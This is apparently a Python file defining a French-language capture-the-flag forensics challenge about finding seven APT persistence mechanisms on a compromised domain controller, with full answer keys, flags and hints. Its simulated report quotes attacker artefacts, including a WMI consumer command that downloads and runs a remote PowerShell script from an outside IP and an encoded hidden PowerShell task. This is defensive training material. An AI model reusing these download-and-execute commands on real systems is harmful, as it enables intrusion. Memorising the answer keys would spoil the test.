"""
Challenge 9 — Persistance APT Avancée
Niveau : 3 (Analyste Senior)
Catégorie : Forensics Système
"""

ARTIFACT_PERSISTENCE = r"""
=== RAPPORT D'ANALYSE FORENSIC — SRV-AD-01 ===
=== Date: 2026-02-18 — Analyste: [EN ATTENTE] ===

[1] TÂCHES PLANIFIÉES (schtasks /query /fo LIST /v)
────────────────────────────────────────────────────
Nom de la tâche:    \Microsoft\Windows\WindowsUpdate\AutoUpdate
État:               Prêt
Déclencheur:        Au démarrage du système
Action:             C:\Windows\System32\wuauclt.exe /detectnow
Compte d'exécution: SYSTEM
Dernière exécution: 18/02/2026 06:00:00
→ VERDICT: [LÉGITIME]

Nom de la tâche:    \Microsoft\Windows\Maintenance\WinSAT
État:               Prêt  
Déclencheur:        Tous les jours à 03:00
Action:             C:\Windows\System32\WinSAT.exe formal
Compte d'exécution: SYSTEM
→ VERDICT: [LÉGITIME]

Nom de la tâche:    \Microsoft\Windows\NetTrace\GatherNetworkInfo
État:               Prêt
Déclencheur:        Toutes les 15 minutes
Action:             rundll32.exe C:\Windows\System32\wbem\ntevt.dll,DllRegisterServer
Compte d'exécution: SYSTEM
Dernière exécution: 18/02/2026 11:45:00
→ Note: ntevt.dll n'existe PAS normalement dans /wbem/. DLL suspecte.
→ SHA256: e4a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1
→ VirusTotal: 0/72 (non détecté — probable custom implant)
→ VERDICT: [SUSPECT — PERSISTENCE MALVEILLANTE #1]

Nom de la tâche:    \GoogleChromeAutoUpdate
État:               Prêt
Déclencheur:        Toutes les 5 minutes
Action:             powershell.exe -ep bypass -w hidden -e SQBFAFgA...
Compte d'exécution: j.martin
→ VERDICT: [MALVEILLANT — PERSISTENCE CONNUE #2]

[2] SERVICES WINDOWS (sc query + analyse)
────────────────────────────────────────────────────
Service: WinDefenderUpdate
  Binpath: C:\Windows\Temp\svc.exe
  Start:   AUTO_START
  Status:  RUNNING
  Account: LocalSystem
  → svc.exe crée des connexions sortantes vers 185.234.72.19:443
  → SHA256: f1e2d3c4b5a6978869504132a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9
  → VirusTotal: 3/72 (Trojan.GenericKD, Backdoor.Win64)
  → VERDICT: [MALVEILLANT — PERSISTENCE #3]

Service: WMI Performance Adapter  
  Binpath: C:\Windows\System32\wbem\WmiApSrv.exe
  Start:   MANUAL
  Status:  STOPPED
  Account: LocalSystem
  → VERDICT: [LÉGITIME]

[3] CLÉS DE REGISTRE RUN
────────────────────────────────────────────────────
HKLM\Software\Microsoft\Windows\CurrentVersion\Run:
  SecurityHealth  : "C:\Windows\System32\SecurityHealthSystray.exe" → [LÉGITIME]
  VMware Tools    : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" → [LÉGITIME]

HKCU\Software\Microsoft\Windows\CurrentVersion\Run (j.martin):
  GoogleChromeAutoUpdate : "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass..." 
  → VERDICT: [MALVEILLANT — PERSISTENCE #4, liée à #2]

HKLM\Software\Microsoft\Windows\CurrentVersion\Run:
  WindowsOptimizer : "C:\ProgramData\Microsoft\Crypto\RSA\updater.exe"
  → updater.exe: signé avec un certificat auto-signé "Microsoft Windows" (FAUX)
  → SHA256: a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8
  → Communications: DNS beaconing vers c2-update-service.xyz toutes les 30 secondes
  → VERDICT: [MALVEILLANT — PERSISTENCE #5]

[4] WMI EVENT SUBSCRIPTIONS
────────────────────────────────────────────────────
Subscription: SCM Event Log Consumer
  Filter:    SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'
  Consumer:  CommandLineEventConsumer
  Command:   powershell.exe -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://185.234.72.19:8080/beacon.ps1')"
  → Se déclenche toutes les 60 secondes quand le système est actif
  → VERDICT: [MALVEILLANT — PERSISTENCE #6, technique WMI très furtive]

[5] GOLDEN TICKET — INDICATEURS
────────────────────────────────────────────────────
  Analyse Kerberos:
  - Ticket TGT détecté avec durée de vie de 10 ans (anormal, défaut = 10h)
  - Ticket émis pour: Administrator@REDPAWN.LOCAL
  - Chiffrement: RC4_HMAC_MD5
  - Le hash KRBTGT a potentiellement été compromis via le dump NTDS
  → VERDICT: [PROBABLE GOLDEN TICKET — PERSISTENCE #7]
"""

CHALLENGE = {
    "id": "c09_apt_persistence",
    "title": "🕵️ Les Sept Péchés de Persistance",
    "category": "forensics",
    "level": 3,
    "points_total": 480,
    "estimated_time": "45-60 min",
    "story": """
## 📋 Briefing de Mission

**Date :** 18 février 2026, 18h00  
**Priorité :** CRITIQUE  
**Source :** Forensic post-incident — Analyse de persistance

---

Après la gestion initiale du ransomware, l'équipe CERT doit s'assurer que l'attaquant n'a pas laissé d'autres mécanismes de persistance qui lui permettraient de revenir.

Un analyste forensic a collecté les artéfacts de persistance du DC (SRV-AD-01). Vous devez les analyser et distinguer les éléments légitimes des implants malveillants.

> *"On a éradiqué le ransomware mais je suis sûr que l'attaquant a laissé des backdoors. L'équipe forensic a collecté les mécanismes de persistance du DC. Trouve-les TOUS. Si on en rate un seul, on se fait re-compromettre dans la semaine."*

**Objectif :** Identifier les 7 mécanismes de persistance malveillants cachés parmi les éléments légitimes.
    """,
    "artifacts": [
        {
            "name": "persistence_analysis.txt",
            "type": "forensic_report",
            "content": ARTIFACT_PERSISTENCE,
            "description": "Rapport forensic de collecte des mécanismes de persistance sur SRV-AD-01"
        }
    ],
    "questions": [
        {
            "id": "q1",
            "text": "Combien de mécanismes de persistance malveillants ont été identifiés au total ?",
            "answer": "7",
            "flag": "FLAG{7}",
            "points": 30,
            "hints": [
                "Cherchez tous les verdicts [MALVEILLANT] et [SUSPECT] et [PROBABLE]",
                "Incluez la tâche planifiée suspecte, le golden ticket, et le WMI"
            ],
            "hint_cost": 10
        },
        {
            "id": "q2",
            "text": "Quelle DLL suspecte est chargée par une fausse tâche GatherNetworkInfo ? (nom du fichier)",
            "answer": "ntevt.dll",
            "flag": "FLAG{ntevt.dll}",
            "points": 50,
            "hints": [
                "Cherchez la tâche planifiée qui utilise rundll32.exe dans /wbem/",
                "La DLL n'existe pas normalement dans ce répertoire"
            ],
            "hint_cost": 17
        },
        {
            "id": "q3",
            "text": "Combien de détections VirusTotal la DLL ntevt.dll a-t-elle ?",
            "answer": "0",
            "flag": "FLAG{0}",
            "points": 40,
            "hints": [
                "0/72 signifie que c'est probablement un implant custom non détecté",
                "C'est une technique APT classique : outil sur mesure avec 0 détection"
            ],
            "hint_cost": 13
        },
        {
            "id": "q4",
            "text": "Quel service malveillant se fait passer pour Windows Defender ? (nom du service)",
            "answer": "WinDefenderUpdate",
            "flag": "FLAG{WinDefenderUpdate}",
            "points": 40,
            "hints": [
                "Cherchez dans la section Services Windows",
                "Le binaire est dans C:\\Windows\\Temp\\"
            ],
            "hint_cost": 13
        },
        {
            "id": "q5",
            "text": "Quel fichier dans ProgramData utilise un faux certificat Microsoft ?",
            "answer": "updater.exe",
            "flag": "FLAG{updater.exe}",
            "points": 50,
            "hints": [
                "Cherchez dans les clés de registre Run le binaire dans ProgramData",
                "Il est signé avec un certificat auto-signé 'Microsoft Windows' (FAUX)"
            ],
            "hint_cost": 17
        },
        {
            "id": "q6",
            "text": "Quelle technique de persistance WMI est utilisée ? (type de consumer WMI)",
            "answer": "CommandLineEventConsumer",
            "flag": "FLAG{CommandLineEventConsumer}",
            "points": 60,
            "hints": [
                "Cherchez dans la section WMI Event Subscriptions",
                "C'est un type de consumer WMI qui exécute des commandes"
            ],
            "hint_cost": 20
        },
        {
            "id": "q7",
            "text": "Quelle technique de persistance Kerberos avancée est suspectée ? (nom de la technique)",
            "answer": "Golden Ticket",
            "flag": "FLAG{Golden_Ticket}",
            "points": 60,
            "hints": [
                "Regardez la section sur les indicateurs Kerberos",
                "Le ticket TGT a une durée de vie de 10 ans, ce qui est anormal"
            ],
            "hint_cost": 20
        },
        {
            "id": "q8",
            "text": "Quelle est la durée de vie anormale du TGT Kerberos suspect ? (en années)",
            "answer": "10",
            "flag": "FLAG{10}",
            "points": 40,
            "hints": [
                "La durée par défaut est de 10 heures",
                "Le ticket suspect a une durée en années, pas en heures"
            ],
            "hint_cost": 13
        },
        {
            "id": "q9",
            "text": "Quel type de chiffrement est utilisé par le Golden Ticket suspect ?",
            "answer": "RC4_HMAC_MD5",
            "flag": "FLAG{RC4_HMAC_MD5}",
            "points": 50,
            "hints": [
                "RC4 est un chiffrement ancien et faible, souvent utilisé dans les Golden Tickets",
                "Regardez la ligne 'Chiffrement' dans les indicateurs Kerberos"
            ],
            "hint_cost": 17
        },
        {
            "id": "q10",
            "text": "À quelle fréquence (en secondes) le WMI event subscription se déclenche-t-il ?",
            "answer": "60",
            "flag": "FLAG{60}",
            "points": 30,
            "hints": [
                "Regardez le filtre WMI : WITHIN X",
                "C'est aussi mentionné dans le verdict"
            ],
            "hint_cost": 10
        }
    ]
}
